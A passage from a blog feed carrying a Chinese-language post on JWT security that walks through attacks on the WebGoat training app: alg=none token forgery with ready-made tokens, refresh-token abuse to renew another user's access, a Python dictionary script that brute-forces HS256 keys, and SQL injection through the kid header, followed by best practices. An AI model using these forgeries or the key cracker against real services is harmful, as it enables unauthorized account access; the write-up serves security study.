&lt;p&gt;这一篇很长，鉴于之前已经分享过的漏洞内容，这里做一个Java漏洞的合集，里面的很多漏洞均已在之前的文章分析过，这里着重讲发现漏洞的trick，如</summary>
      
    
    
    
    <category term="JAVA安全基础" scheme="https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="审计技巧" scheme="https://j3f5.github.io/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>JWT安全</title>
    <link href="https://j3f5.github.io/articles/2023/06/07/JWT%E5%AE%89%E5%85%A8/"/>
    <id>https://j3f5.github.io/articles/2023/06/07/JWT%E5%AE%89%E5%85%A8/</id>
    <published>2023-06-07T06:14:47.000Z</published>
    <updated>2023-06-08T06:14:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jwt概念"><a class="markdownIt-Anchor" href="#jwt概念"></a> JWT概念</h1><p>JSON Web Token（简称 JWT）是目前最流行的<strong>跨域认证</strong>解决方案。是一种<strong>认证授权机制</strong>。</p><img src="/images/JWT%E5%AE%89%E5%85%A8/JWT%E5%AE%89%E5%85%A8.png" alt="JWT安全" style="zoom:80%;" /><h2 id="组成部分"><a class="markdownIt-Anchor" href="#组成部分"></a> 组成部分</h2><p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230607154004007.png" alt="image-20230607154004007" /></p><p>上面是使用base64编码的。头部和声明 部分都由JSON对象表示。头部 描述了应用于JWT的加密操作，以及JWT的附加属性，可以选择。声明代表一个JSON对象，其成员是JWT所传达的声明。</p><p>我们可以使用这个工具来解密：<a href="https://jwt.io/">https://jwt.io/</a></p><h3 id="头部-header"><a class="markdownIt-Anchor" href="#头部-header"></a> 头部 Header</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;alg&quot;:&quot;HS256&quot;,</span><br><span class="line">&quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>alg</strong></p><blockquote><p>是说明这个JWT 的签名使用的算法的参数，常见值用HS256（默认），HS512 等，也可以为None。HS256表示 HMAC SHA256。</p></blockquote><p><strong>typ</strong></p><blockquote><p>说明这个 token 的类型为 JWT</p></blockquote><h3 id="声明-claims"><a class="markdownIt-Anchor" href="#声明-claims"></a> 声明 Claims</h3><p>令牌包含识别用户的要求，以及服务器满足请求所需的所有其他信息。请注意不要在令牌中存储敏感信息，并始终通过安全通道发送。例如解码得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;exp&quot;: 1416471934,</span><br><span class="line">&quot;user_name&quot;: &quot;user&quot;,</span><br><span class="line">&quot;scope&quot;: [</span><br><span class="line">&quot;read&quot;,</span><br><span class="line">&quot;write&quot;</span><br><span class="line">],</span><br><span class="line">&quot;authorities&quot;: [</span><br><span class="line">&quot;ROLE_ADMIN&quot;,</span><br><span class="line">&quot;ROLE_USER&quot;</span><br><span class="line">],</span><br><span class="line">&quot;jti&quot;: &quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;,</span><br><span class="line">&quot;client_id&quot;: &quot;my-client-with-secret&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>JWT 固定参数有：</strong></p><ul><li>iss：发行人</li><li>exp：到期时间</li><li>sub：主题</li><li>aud：用户</li><li>nbf：在此之前不可用</li><li>iat：发布时间</li><li>jti：JWT ID 用于标识该 JWT</li></ul><h3 id="签名-signature"><a class="markdownIt-Anchor" href="#签名-signature"></a> 签名 Signature</h3><p>每个JWT令牌在发送给客户端之前至少应该被<strong>签名</strong>，如果一个令牌没有被签名，客户端应用程序将能够改变令牌的内容。签名规范在这里定义，你可以使用的具体算法在这里描述。基本上，你使用</p><ul><li>HMAC与SHA-2函数</li><li>数字签名与RSASSA-PKCS1-v1_5/ECDSA/RSASSA-PSS 函数</li></ul><p>来签名令牌。在执行任何其他操作之前验证签名是一个重要的步骤。<strong>【需要密钥！】</strong></p><h2 id="认证与获取jwt令牌"><a class="markdownIt-Anchor" href="#认证与获取jwt令牌"></a> 认证与获取JWT令牌</h2><p><img src="/images/JWT%E5%AE%89%E5%85%A8/jwt_diagram.png" alt="jwt diagram" /></p><p>在这个流程中，你可以看到</p><ol><li>用户用一个用户名和密码登录，认证成功后，服务器会返回。</li><li>服务器创建一个新的令牌并将这个令牌返回给客户端。</li><li>当客户端连续调用服务器时，它在 &quot;授权 &quot;头中附加了新的令牌。</li><li>服务器读取令牌并首先验证签名，验证成功后，服务器使用令牌中的信息来识别用户。</li></ol><h2 id="分类访问access令牌与刷新refresh令牌"><a class="markdownIt-Anchor" href="#分类访问access令牌与刷新refresh令牌"></a> 分类访问(Access)令牌与刷新(Refresh)令牌</h2><p>通常有两种类型的令牌：访问令牌和刷新令牌。访问令牌用于对服务器进行 API 调用。访问令牌的生命周期有限，这就是刷新令牌的用武之地。一旦访问令牌不再有效，就可以向服务器发出请求，以通过出示刷新令牌来获取新的访问令牌。刷新令牌可以过期，但它们的寿命要长得多。</p><p>这解决了用户必须使用其凭据再次进行身份验证的问题。您是否应该使用刷新令牌和访问令牌取决于以下几点，在选择要使用的令牌时要牢记以下几点。</p><ol><li><p>登录获取令牌：<code>curl -X POST -H -d 'username=webgoat&amp;password=webgoat' localhost:8080/WebGoat/login</code></p></li><li><p>服务器返回令牌：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;token_type&quot;:&quot;bearer&quot;,</span><br><span class="line">    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,</span><br><span class="line">    &quot;expires_in&quot;:10,</span><br><span class="line">    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如您所见，<strong>刷新令牌是一个随机字符串</strong>，服务器可以对其进行跟踪（在内存中或存储在数据库中），<strong>以便将刷新令牌与授予刷新令牌的用户相匹配</strong>。因此，在这种情况下，只要访问令牌仍然有效，我们就可以说是“无状态”会话，服务器端设置用户会话没有负担，令牌是自包含的。当访问令牌不再有效时，<strong>服务器需要查询存储的刷新令牌以确保令牌未以任何方式被阻止</strong>。</p></li><li><p><strong>每当攻击者获得访问令牌时，它仅在一定时间内有效（比如 10 分钟）</strong>。然后攻击者需要刷新令牌来获取新的访问令牌。这就是刷新令牌需要更好保护的原因。也可以使刷新令牌无状态，但这意味着将更难查看用户是否撤销了令牌。服务器完成所有验证后，它必须向客户端返回一个新的刷新令牌和一个新的访问令牌。客户端可以使用新的访问令牌进行 API 调用。</p></li></ol><p>无论选择哪种解决方案，您都应该在服务器端存储足够的信息以验证用户是否仍然可信。</p><ul><li><strong>存储 ip 地址</strong></li><li><strong>跟踪使用刷新令牌的次数</strong>（在访问令牌的有效时间窗口内多次使用刷新令牌可能表示奇怪的行为，你可以撤销所有令牌并让用户再次进行身份验证）</li><li><strong>跟踪哪个访问令牌属于哪个刷新令牌</strong>，否则攻击者可能能够使用攻击者的刷新令牌为不同的用户获取新的访问令牌（参见 <a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/</a> 以获得关于此攻击如何工作的精彩文章）</li><li><strong>检查用户的 IP 地址或地理位置</strong>。如果您需要发出新的令牌，请检查位置是否仍然相同，如果不撤销所有令牌并让用户再次进行身份验证。</li></ul><h2 id="jwt的用处"><a class="markdownIt-Anchor" href="#jwt的用处"></a> JWT的用处</h2><p>在现代单页应用程序 (SPA) 中使用刷新令牌是否有意义？正如我们在关于存储令牌的部分中看到的那样，有两种选择：</p><ul><li>Web 存储</li><li>cookie</li></ul><p>这意味着刷新令牌就在访问令牌旁边，因此如果访问令牌泄露，刷新令牌也可能会受到损害。大多数时候当然是有区别的。</p><p>访问令牌在您进行 API 调用时发送，<strong>刷新令牌仅在应获取新访问令牌时发送</strong>，这在大多数情况下是不同的端点。如果您最终在同一台服务器上，您可以选择仅使用访问令牌。</p><p>如上所述，使用访问令牌和单独的刷新令牌为服务器提供了一些杠杆，而不是一遍又一遍地检查访问令牌。仅在用户需要新的访问令牌时执行检查。当然可以只使用访问令牌。在服务器上，您存储的信息与您为刷新令牌存储的信息完全相同，请参阅上一段。这样您每次都需要检查令牌，但这可能适用于不同的应用程序。在存储刷新令牌以进行验证的情况下，保护这些令牌也很重要（至少使用哈希函数将它们存储在数据库中）。</p><p>有很多可用资源质疑使用 JWT 令牌进行客户端到服务器身份验证的用例。<strong>使用 JWT 令牌的最佳位置是服务器到服务器之间的通信</strong>。在普通的 Web 应用程序中，您最好使用普通的旧 cookie。</p><img src="/images/JWT%E5%AE%89%E5%85%A8/jwt-flowchart.png" alt="img" style="zoom:80%;" /><h1 id="伪造签名令牌"><a class="markdownIt-Anchor" href="#伪造签名令牌"></a> 伪造签名令牌</h1><h2 id="伪造access_token攻击"><a class="markdownIt-Anchor" href="#伪造access_token攻击"></a> 伪造access_token攻击</h2><p>截获数据包，发现</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230607161353947.png" alt="image-20230607161353947" style="zoom:67%;" /><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230607161318132.png" alt="image-20230607161318132" style="zoom:67%;" /><p>发现里面有个字段为：admin=false，改成true试试看。但是返回一个：token不正确，要检查。所以可能是签名出问题了，我们改了参数值，同步的签名也要进行更改的，但是我们没有密钥，所以后面的签名没办法更改。我们可以尝试更改头部，让它不用密钥加密就好啦，直接 none 走起！操作如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;none&quot;&#125;</span><br><span class="line">eyJhbGciOiJub25lIn0=</span><br><span class="line">&#123;&quot;iat&quot;:1686989890,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Tom&quot;&#125;</span><br><span class="line">eyJpYXQiOjE2ODY5ODk4OTAsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==</span><br></pre></td></tr></table></figure><p>但是在HTTP数据传输的过程中，Base64编码中的<code>=+/</code>等特殊的符号通过URL容易产生歧义，所以产生了与URL兼容的Base64 URL编码，所以把<code>=</code>删掉，就构造好了：<code>eyJhbGciOiJub25lIn0.eyJpYXQiOjE2ODY5ODk4OTAsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</code></p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230607165148603.png" alt="image-20230607165148603" style="zoom:50%;" /><h2 id="伪造authorization"><a class="markdownIt-Anchor" href="#伪造authorization"></a> 伪造authorization</h2><p>这个的伪造点在字段：Authorization中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /WebGoat/JWT/refresh/checkout HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Content-Length: 0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;112&quot;, &quot;Google Chrome&quot;;v=&quot;112&quot;, &quot;Not:A-Brand&quot;;v=&quot;99&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Authorization: Bearer null</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>我们有一个JWT token：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q</span><br></pre></td></tr></table></figure><h3 id="第一种更改时间-algnone"><a class="markdownIt-Anchor" href="#第一种更改时间-algnone"></a> 第一种：更改时间 &amp;&amp; alg=none</h3><p>分析得到这个token早就过期了，那么我们<strong>重新弄一下这个过期时间</strong>，然后把签名去掉。参考上面的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJub25lIn0.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6IDE2ODYyOTAzMTgsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</span><br></pre></td></tr></table></figure><h3 id="第二种使用refresh-token"><a class="markdownIt-Anchor" href="#第二种使用refresh-token"></a> 第二种：使用refresh token</h3><p>通常，在响应 JWT 身份验证/刷新请求时，你会得到如下所示的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:0,&quot;data&quot;:&#123;&quot;access_token&quot;:&quot;XXX.YYY.ZZZ&quot;,&quot;access_token_expiration&quot;:&quot;Thursday, November 9th, 2017, 10:27:33 PM&quot;,&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>此示例中的访问令牌将于10:27:33过期。通常，应用程序将使用刷新令牌在到期日期之前刷新/获取新的访问令牌。该请求将转到授权服务器，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /auth/refresh HTTP/1.1</span><br><span class="line">Host: auth.example.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Authorization: Bearer XXX.YYY.ZZZ</span><br><span class="line"></span><br><span class="line">&#123;&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;</span><br></pre></td></tr></table></figure><p>当前访问令牌位于授权标头中，刷新令牌位于 POST 正文中。作为回报，您将获得一个全新的访问令牌、到期日期和刷新令牌。则我们伪造：<strong>使用我的刷新令牌刷新其他人的访问令牌</strong></p><p><strong>操作如下：</strong></p><ol><li><p>F12查看流量，搜索：refresh_token，得到：</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608113035376.png" alt="image-20230608113035376" style="zoom:50%;" /></li><li><p>获取这个refresh_token，还有之前tom的token，抓包贴上（改URL，改content-type…），如下，就可刷新我们的token了，我们的token就不怕过期了！（得到URL的方式也很重要）</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608113958918.png" alt="image-20230608113958918" style="zoom:50%;" /><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608113551369-16861953534983.png" alt="image-20230608113551369" style="zoom: 50%;" /></li><li><p>贴上我们刚获得的token，就OK了！</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608113811331.png" alt="image-20230608113811331" style="zoom: 50%;" /></li></ol><h2 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计"></a> 代码审计</h2><h3 id="更改token细节匹配"><a class="markdownIt-Anchor" href="#更改token细节匹配"></a> 更改token细节——匹配</h3><p>对比下面两个代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">   Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken);</span><br><span class="line">   Claims claims = (Claims) jwt.getBody();</span><br><span class="line">   String user = (String) claims.get(&quot;user&quot;);</span><br><span class="line">   boolean isAdmin = Boolean.valueOf((String) claims.get(&quot;admin&quot;));</span><br><span class="line">   if (isAdmin) &#123;</span><br><span class="line">     removeAllUsers();</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">     log.error(&quot;You are not an admin user&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; catch (JwtException e) &#123;</span><br><span class="line">  throw new InvalidTokenException(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">   Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br><span class="line">   Claims claims = (Claims) jwt.getBody();</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>就是第2行代码不一样。主要涉及两个函数：</p><ol><li>parseClaimsJws：</li><li>parse</li></ol><h3 id="refresh-token生成"><a class="markdownIt-Anchor" href="#refresh-token生成"></a> refresh token——生成</h3><p>看到代码存在两个POSTMAPPING：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&#123;&quot;/JWT/refresh/checkout&quot;&#125;)</span><br><span class="line">@PostMapping(&#123;&quot;/JWT/refresh/newToken&quot;&#125;)</span><br></pre></td></tr></table></figure><p>第一个是确认订单的，主要看第二个生成refresh token：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/JWT/refresh/login&quot;&#125;,</span></span><br><span class="line"><span class="meta">    consumes = &#123;&quot;application/json&quot;&#125;,</span></span><br><span class="line"><span class="meta">    produces = &#123;&quot;application/json&quot;&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity <span class="title function_">follow</span><span class="params">(<span class="meta">@RequestBody(required = false)</span> Map&lt;String, Object&gt; json)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (json == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String)json.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> (String)json.get(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Jerry&quot;</span>.equalsIgnoreCase(user) &amp;&amp; <span class="string">&quot;bm5nhSkxCXZkKRy4&quot;</span>.equals(password) ? ResponseEntity.ok(<span class="built_in">this</span>.createNewTokens(user)) : ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> ResponseEntity <span class="title function_">newToken</span><span class="params">(<span class="meta">@RequestHeader(value = &quot;Authorization&quot;,required = false)</span> String token, <span class="meta">@RequestBody(required = false)</span> Map&lt;String, Object&gt; json)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (token != <span class="literal">null</span> &amp;&amp; json != <span class="literal">null</span>) &#123;</span><br><span class="line">            String user;</span><br><span class="line">            String refreshToken;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Jwt&lt;Header, Claims&gt; jwt = Jwts.parser().setSigningKey(<span class="string">&quot;bm5n3SkxCX4kKRy4&quot;</span>).parse(token.replace(<span class="string">&quot;Bearer &quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">                user = (String)((Claims)jwt.getBody()).get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">                refreshToken = (String)json.get(<span class="string">&quot;refresh_token&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ExpiredJwtException var6) &#123;</span><br><span class="line">                user = (String)var6.getClaims().get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">                refreshToken = (String)json.get(<span class="string">&quot;refresh_token&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user != <span class="literal">null</span> &amp;&amp; refreshToken != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (validRefreshTokens.contains(refreshToken)) &#123;</span><br><span class="line">                    validRefreshTokens.remove(refreshToken);</span><br><span class="line">                    <span class="keyword">return</span> ResponseEntity.ok(<span class="built_in">this</span>.createNewTokens(user));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从上面可以看到，我们需要的Username为Jerry，密码是静态的。那么根据responsebody，我们构造请求包，这里知道是json格式：通过checkout的请求包，将conten-type改为json，然后构造参数，即可获得refresh token。</p><p>在/JWT/refresh/newToken接口，首先接收Authorization的值，进行jwt解码，得到user，然后再从json中得到refresh_token，如果refresh_token有效，则刷新access_token。</p><h1 id="密钥爆破攻击"><a class="markdownIt-Anchor" href="#密钥爆破攻击"></a> 密钥爆破攻击</h1><p>相对于上面，如果我们有密钥，那么我们就可以跟着修改签名，重新构造数据包进行攻击。我们可以发起离线的暴力破解发起对密钥的攻击。字典的话需要自己找。具体流程如下：</p><ol><li><p>抓取到JWT token，分析得到如下：</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608093247180.png" alt="image-20230608093247180" style="zoom:50%;" /></li><li><p>将token放到破解脚本里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">alg = <span class="string">&quot;HS256&quot;</span></span><br><span class="line">jwt_str = <span class="string">&quot;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY4NjE4NzUwOCwiZXhwIjoxNjg2MTg3NTY4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.0TkftJKgV9kqnroqC_5QhsJdkxhl7x65m4ZPSA8Qq4M&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pass.txt&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        key_ = line.strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_, algorithms=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found key! --&gt; &#x27;</span> + key_)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError,</span><br><span class="line">               jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">               jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found key! --&gt; &#x27;</span> + key_)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key not found!&quot;</span>)</span><br></pre></td></tr></table></figure><p>找个好一点的字典直接开干</p></li><li><p>破解到之后，<strong>大概率token已经过期了</strong>，所以重新生成（但是密钥应该不会变），重新构造，例如得到密钥：<code>shipping</code></p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608093530949.png" alt="image-20230608093530949" style="zoom:50%;" /></li></ol><h1 id="综合利用"><a class="markdownIt-Anchor" href="#综合利用"></a> 综合利用</h1><h2 id="与sql注入结合"><a class="markdownIt-Anchor" href="#与sql注入结合"></a> 与sql注入结合</h2><p>JWT由这个组成，看到kid不是自带的固定字段，所以可能有设么含义：</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608122654080.png" alt="image-20230608122654080" style="zoom:50%;" /><p>然后看到源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ResultSet rs = connection.createStatement().executeQuery(&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot; + kid + &quot;&#x27;&quot;);</span><br><span class="line">...</span><br><span class="line">var6 = TextCodec.BASE64.decode(rs.getString(1));</span><br></pre></td></tr></table></figure><p>从Header中获取“kid”直接插入sql查询语句中，存在SQL注入，将返回结果进行了base64解码作为KEY，然后进行解析。然后解析后 ，username参数等于”Tom”，则删除。</p><p>参考：<a href="https://www.cnblogs.com/yokan/p/15202333.html">https://www.cnblogs.com/yokan/p/15202333.html</a></p><h2 id="nodejs前端jw登录安全伪造admin"><a class="markdownIt-Anchor" href="#nodejs前端jw登录安全伪造admin"></a> Node.js前端jw登录安全，伪造admin</h2><ol><li><p>注册用户登录，分析：<code>controllers/api.js</code>，看到需要我们伪造用户：admin</p></li><li><p>抓取数据包，进行解密修改后再加密，伪造登录即可</p></li></ol><h1 id="安全使用"><a class="markdownIt-Anchor" href="#安全使用"></a> 安全使用</h1><p>使用 JWT 时的一些最佳实践：</p><ul><li>固定算法，不允许客户端切换算法。</li><li>使用对称密钥对令牌进行签名时，请确保使用适当的密钥长度。</li><li>确保添加到令牌的声明不包含个人信息。如果您需要添加更多信息，也可以选择加密令牌。</li><li>向您的项目添加足够的测试用例以验证无效令牌实际上不起作用。与第三方集成以检查您的令牌并不意味着您根本没有测试您的应用程序。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;jwt概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#jwt概念&quot;&gt;&lt;/a&gt; JWT概念&lt;/h1&gt;
&lt;p&gt;JSON Web Token（简称 JWT）是目前最流行的&lt;strong&gt;跨域认证&lt;/strong&gt;解决方案。是一种&lt;stro</summary>
      
    
    
    
    <category term="JAVA安全基础" scheme="https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
